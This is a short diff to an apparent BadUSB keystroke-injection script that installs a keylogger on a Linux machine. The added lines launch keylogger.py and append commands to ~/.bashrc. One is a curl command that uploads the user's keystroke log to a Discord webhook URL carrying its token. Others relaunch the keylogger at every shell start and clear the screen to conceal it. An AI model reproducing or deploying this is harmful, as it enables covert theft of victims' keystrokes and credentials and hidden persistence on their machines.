@@ -27,10 +27,18 @@ ENTER
 DELAY 1000
 STRING chmod +x keylogger.py
 ENTER
+ALT CTRL t
 DELAY 1000
-STRING nohup python3 keylogger.py &
+STRING python3 /home/$USER/Keylogger/linux/keylogger.py &
 ENTER
 ALT CTRL t
 DELAY 1000
-STRING echo "nohup python keylogger.py &" >> ~/.bashrc
+STRING echo "curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" " >> ~/.bashrc
 ENTER
+DELAY 10
+STRING echo "python3 /home/$USER/Keylogger/linux/keylogger.py &" >> ~/.bashrc
+ENTER
+DELAY 10
+STRING echo "clear" >> ~/.bashrc
+ENTER
+
